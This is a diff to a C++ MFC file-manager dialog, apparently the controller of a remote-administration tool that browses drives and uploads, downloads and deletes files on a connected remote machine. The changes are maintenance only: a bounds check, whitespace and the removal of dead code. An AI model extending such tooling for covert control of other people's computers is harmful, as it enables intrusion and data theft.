@@ -80,7 +80,10 @@ CFileManagerDlg::CFileManagerDlg(CWnd* pParent, CIOCPServer* pIOCPServer, Client
 
 	// 保存远程驱动器列表
 	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
-	memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
+	PBYTE pSrc = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
+	int length = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
+	if (length > 0)
+		memcpy(m_bRemoteDriveList, pSrc, length);
 
 	m_nTransferMode = TRANSFER_MODE_NORMAL;
 	m_nOperatingFileLength = 0;
@@ -305,7 +308,6 @@ void CFileManagerDlg::OnSize(UINT nType, int cx, int cy)
 	GetDlgItem(IDC_STATIC_REMOTE)->MoveWindow(20, cy / 2, 25, 20);
 	GetDlgItem(IDC_REMOTE_PATH)->MoveWindow(53, (cy / 2) - 4 , 210, 12);
 
-
 	GetClientRect(&rect);
 	//显示工具栏
 	m_wndToolBar_Local.MoveWindow(268, 0, rect.right - 268, 48);
@@ -350,7 +352,6 @@ void CFileManagerDlg::FixedLocalDriveList()
 			AmntMB = 0;
 			FreeMB = 0;
 		}
-		
 
 		int	nItem = m_list_local.InsertItem(i, pDrive, GetIconIndex(pDrive, GetFileAttributes(pDrive)));
 		m_list_local.SetItemData(nItem, 1);
@@ -407,9 +408,6 @@ void CFileManagerDlg::FixedLocalFileList(CString directory)
 		}
 	}
 
-
-
-
 	// 得到父目录
 	if (directory == "..")
 	{
@@ -422,7 +420,6 @@ void CFileManagerDlg::FixedLocalFileList(CString directory)
 		if(m_Local_Path.Right(1) != "\\")
 			m_Local_Path += "\\";
 	}
-
 
 	// 是驱动器的根目录,返回磁盘列表
 	if (m_Local_Path.GetLength() == 0)
@@ -501,7 +498,6 @@ void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
 		return;
 	} //EO if(pDragList...
 
-
 	pDropList->SetItemState(m_nDropIndex, 0, LVIS_DROPHILITED);
 
 	if ((CWnd *)pDropList == &m_list_local)
@@ -519,48 +515,6 @@ void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)
 	}
 	// 重置
 	m_nDropIndex = -1;
-//	靠，下面的代码不要了，复制文件了
-// 	if(pDragList->GetSelectedCount() == 1)
-// 	{
-// 		char	szLabel[MAX_PATH];
-// 		LVITEM	lviT;
-// 		ZeroMemory(&lviT, sizeof (LVITEM)); //allocate and clear memory space for LV_ITEM
-// 		lviT.iItem		= m_nDragIndex;
-// 		lviT.mask		= LVIF_IMAGE | LVIF_TEXT;
-// 		lviT.pszText	= szLabel;
-// 		lviT.cchTextMax	= MAX_PATH;
-// 		pDragList->GetItem (&lviT);
-// 
-// 		// Select the new item we just inserted
-// 		int	iItem = (m_nDropIndex == -1) ? pDropList->GetItemCount () : m_nDropIndex;
-// 
-// 		pDropList->InsertItem(iItem, szLabel, lviT.iImage);
-// 
-// 		pDropList->SetItemState (iItem, LVIS_SELECTED, LVIS_SELECTED);
-// 	}
-// 	else //more than 1 item is being dropped
-// 	{
-// 		POSITION pos = pDragList->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
-// 		while(pos) //so long as we have a valid POSITION, we keep iterating
-// 		{
-// 			m_nDragIndex = pDragList->GetNextSelectedItem(pos);
-// 			m_nDropIndex = (m_nDropIndex == -1) ? pDropList->GetItemCount() : m_nDropIndex;	
-// 
-// 			char	szLabel[MAX_PATH];
-// 			LVITEM	lviT;
-// 			ZeroMemory(&lviT, sizeof (LVITEM)); //allocate and clear memory space for LV_ITEM
-// 			lviT.iItem		= m_nDragIndex;
-// 			lviT.mask		= LVIF_IMAGE | LVIF_TEXT;
-// 			lviT.pszText	= szLabel;
-// 			lviT.cchTextMax	= MAX_PATH;
-// 			pDragList->GetItem (&lviT);
-// 
-// 			pDropList->InsertItem(m_nDropIndex, szLabel, lviT.iImage);
-// 			pDropList->SetItemState(m_nDropIndex, LVIS_SELECTED, LVIS_SELECTED);
-// 			m_nDropIndex ++;
-// 			//Save the pointer to the new item in our CList
-// 		} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
-// 	}
 }
 
 // The system calls this to obtain the cursor to display while the user drags
@@ -612,7 +566,6 @@ void CFileManagerDlg::OnBegindragListRemote(NMHDR* pNMHDR, LRESULT* pResult)
 	m_nDragIndex = pNMListView->iItem;
 	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
 		return;	
-	
 	
 	//We will call delete later (in LButtonUp) to clean this up
 	
@@ -799,7 +752,6 @@ BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
 		其二， 它不适合包含几个视窗的主框窗口。
 	*/
 
-
 	if(m_wndToolBar_Local.IsWindowVisible())
 	{
 		CWnd* pWndParent = m_wndToolBar_Local.GetParent();
@@ -813,6 +765,7 @@ BOOL CFileManagerDlg::PreTranslateMessage(MSG* pMsg)
 
 	return CDialog::PreTranslateMessage(pMsg);
 }
+
 void CFileManagerDlg::OnTimer(UINT nIDEvent) 
 {
 	// TODO: Add your message handler code here and/or call default
@@ -837,14 +790,13 @@ void CFileManagerDlg::FixedRemoteDriveList()
 	m_list_remote.InsertColumn(2, "总大小", LVCFMT_LEFT, 100);
 	m_list_remote.InsertColumn(3, "可用空间", LVCFMT_LEFT, 115);
 
-
 	char	*pDrive = NULL;
 	pDrive = (char *)m_bRemoteDriveList;
 
 	unsigned long		AmntMB = 0; // 总大小
 	unsigned long		FreeMB = 0; // 剩余空间
-	char				VolName[MAX_PATH];
-	char				FileSystem[MAX_PATH];
+	//char				VolName[MAX_PATH];
+	//char				FileSystem[MAX_PATH];
 
 	/*
 	6	DRIVE_FLOPPY
@@ -913,7 +865,6 @@ void CFileManagerDlg::FixedRemoteDriveList()
 			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
 		}
 
-
 		i += lstrlen(pDrive + i) + 1;
 	}
 	// 重置远程当前路径
@@ -956,6 +907,7 @@ CString CFileManagerDlg::GetParentDirectory(CString strPath)
 		strCurPath += "\\";
 	return strCurPath;
 }
+
 void CFileManagerDlg::OnReceiveComplete()
 {
 	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
@@ -1054,6 +1006,7 @@ void CFileManagerDlg::GetRemoteFileList(CString directory)
 	m_list_remote.EnableWindow(FALSE);
 	m_ProgressCtrl->SetPos(0);
 }
+
 void CFileManagerDlg::OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
 {
 	if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
@@ -1079,7 +1032,6 @@ void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
 	m_list_remote.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
 	m_list_remote.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
 	m_list_remote.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);
-
 
 	int	nItemIndex = 0;
 	m_list_remote.SetItemData
@@ -1187,7 +1139,6 @@ BOOL CFileManagerDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
 	//让上一层的边框窗口优先处理该消息
 	if (GetRoutingFrame() != NULL)
 	return FALSE;
-
 
 	//分ANSI and UNICODE两个处理版本
 	TOOLTIPTEXTA* pTTTA = (TOOLTIPTEXTA*)pNMHDR;
@@ -1368,6 +1319,7 @@ void CFileManagerDlg::OnUpdateRemoteStop(CCmdUI* pCmdUI)
 	// TODO: Add your command update UI handler code here
 	pCmdUI->Enable(!m_list_remote.IsWindowEnabled() && !m_bIsUpload);
 }
+
 bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
 {
 	char	lpszFilter[MAX_PATH];
@@ -1417,6 +1369,7 @@ void CFileManagerDlg::EnableControl(BOOL bEnable)
 	m_Local_Directory_ComboBox.EnableWindow(bEnable);
 	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
 }
+
 void CFileManagerDlg::OnLocalCopy() 
 {
 	m_bIsUpload = true;
@@ -1489,7 +1442,6 @@ void CFileManagerDlg::OnRemoteCopy()
 // 发出一个下载任务
 BOOL CFileManagerDlg::SendDownloadJob()
 {
-
 	if (m_Remote_Download_Job.IsEmpty())
 		return FALSE;
 
@@ -1637,14 +1589,12 @@ void CFileManagerDlg::CreateLocalRecvFile()
 	WIN32_FIND_DATA FindFileData;
 	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);
 
-
 	if (hFind != INVALID_HANDLE_VALUE
 		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
 		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
 		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
 		)
 	{
-
 		CFileTransferModeDlg	dlg(this);
 		dlg.m_strFileName = m_strReceiveLocalFile;
 		switch (dlg.DoModal())
@@ -1724,7 +1674,6 @@ void CFileManagerDlg::CreateLocalRecvFile()
 			memset(bToken + 1, 0, 8);
 			// 重新创建
 			dwCreationDisposition = CREATE_ALWAYS;
-			
 		}
 		// 跳过，指针移到-1
 		else if (nTransferMode == TRANSFER_MODE_JUMP)
@@ -1743,7 +1692,6 @@ void CFileManagerDlg::CreateLocalRecvFile()
 		dwCreationDisposition = CREATE_ALWAYS;
 	}
 	FindClose(hFind);
-
 
 	HANDLE	hFile = 
 		CreateFile
@@ -1775,11 +1723,10 @@ void CFileManagerDlg::CreateLocalRecvFile()
 		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
 	}
 }
-// 写入文件内容
 
+// 写入文件内容
 void CFileManagerDlg::WriteLocalRecvFile()
 {
-
 	// 传输完毕
 	BYTE	*pData;
 	DWORD	dwBytesToWrite;
@@ -1795,7 +1742,6 @@ void CFileManagerDlg::WriteLocalRecvFile()
 
 	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
 	LONG	dwOffsetLow = pFileSize->dwSizeLow;
-
 
 	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;
 
@@ -1878,7 +1824,6 @@ void CFileManagerDlg::EndLocalRecvFile()
 
 void CFileManagerDlg::EndLocalUploadFile()
 {
-
 	m_nCounter = 0;
 	m_strOperatingFile = "";
 	m_nOperatingFileLength = 0;
@@ -1899,6 +1844,7 @@ void CFileManagerDlg::EndLocalUploadFile()
 	}
 	return;
 }
+
 void CFileManagerDlg::EndRemoteDeleteFile()
 {
 	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
@@ -1943,7 +1889,6 @@ void CFileManagerDlg::ShowProgress()
 		lpDirection = "传送文件";
 	else
 		lpDirection = "接收文件";
-
 
 	if ((int)m_nCounter == -1)
 	{
@@ -2107,13 +2052,11 @@ void CFileManagerDlg::SendFileData()
 
 	ShowProgress();
 
-
 	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)
 	{
 		EndLocalUploadFile();
 		return;
 	}
-
 
 	HANDLE	hFile;
 	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
@@ -2446,7 +2389,6 @@ void CFileManagerDlg::OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult)
 	}
 	else
 		pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);
-	
 	
 	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
 	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
